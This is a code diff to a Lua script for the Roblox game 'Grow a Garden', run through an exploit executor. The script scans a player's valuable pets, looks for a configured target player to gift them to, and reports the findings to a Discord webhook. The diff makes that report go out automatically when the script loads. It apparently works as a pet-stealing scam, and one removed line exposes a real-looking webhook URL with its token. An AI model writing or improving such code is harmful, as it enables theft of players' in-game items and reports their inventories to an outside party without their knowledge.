@@ -36,7 +36,8 @@ local isRunning = false
 
 -- Webhook Functions
 local function SendWebhook(data)
-    if not Config.WebhookURL or Config.WebhookURL == "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk" then
+    if not Config.WebhookURL or Config.WebhookURL == "YOUR_DISCORD_WEBHOOK_URL_HERE" then
+        Log("⚠️ No webhook URL configured")
         return false
     end
     
@@ -113,12 +114,24 @@ local function CreatePetListEmbed(pets, targetPlayer)
         targetPlayer and targetPlayer.Name or "Not found"
     )
     
+    -- Count pets by rarity
+    local divineCount = 0
+    local mythicalCount = 0
+    
     if #pets > 0 then
         description = description .. "**🐾 Valuable Pets Found:**\n"
         for i, pet in ipairs(pets) do
             local emoji = pet.rarity == "Divine" and "✨" or "🔮"
             description = description .. string.format("%s **%s** (%s) - Level %d\n", 
                 emoji, pet.name, pet.rarity, pet.level)
+            
+            -- Count pets
+            if pet.rarity == "Divine" then
+                divineCount = divineCount + 1
+            elseif pet.rarity == "Mythical" then
+                mythicalCount = mythicalCount + 1
+            end
+            
             if i >= 10 then -- Limit to 10 pets in embed
                 description = description .. "... and " .. (#pets - 10) .. " more\n"
                 break
@@ -130,7 +143,6 @@ local function CreatePetListEmbed(pets, targetPlayer)
     
     return {
         username = "Grow a Garden Bot",
-        avatar_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png", -- Optional: Bot avatar
         embeds = {{
             title = "🎮 Pet Scanner Report",
             description = description,
@@ -139,10 +151,7 @@ local function CreatePetListEmbed(pets, targetPlayer)
                 {
                     name = "📊 Statistics",
                     value = string.format("Total Pets: %d\nDivine: %d\nMythical: %d",
-                        #pets,
-                        #(function() local count = 0; for _, p in ipairs(pets) do if p.rarity == "Divine" then count = count + 1 end end return count end)(),
-                        #(function() local count = 0; for _, p in ipairs(pets) do if p.rarity == "Mythical" then count = count + 1 end end return count end)()
-                    ),
+                        #pets, divineCount, mythicalCount),
                     inline = true
                 },
                 {
@@ -152,8 +161,7 @@ local function CreatePetListEmbed(pets, targetPlayer)
                 }
             },
             footer = {
-                text = "Ronix Executor • Grow a Garden",
-                icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                text = "Ronix Executor • Grow a Garden"
             }
         }}
     }
@@ -546,6 +554,12 @@ end
 -- Main Logic
 local function Main()
     Log("🌱 Gifting system started, looking for: " .. Config.TargetPlayerName)
+    
+    -- Send initial webhook when script loads
+    Log("📡 Sending initial server scan...")
+    local initialPets = GetGiftablePets()
+    local initialWebhook = CreatePetListEmbed(initialPets, FindTargetPlayer())
+    SendWebhook(initialWebhook)
     
     while true do
         if not isRunning then
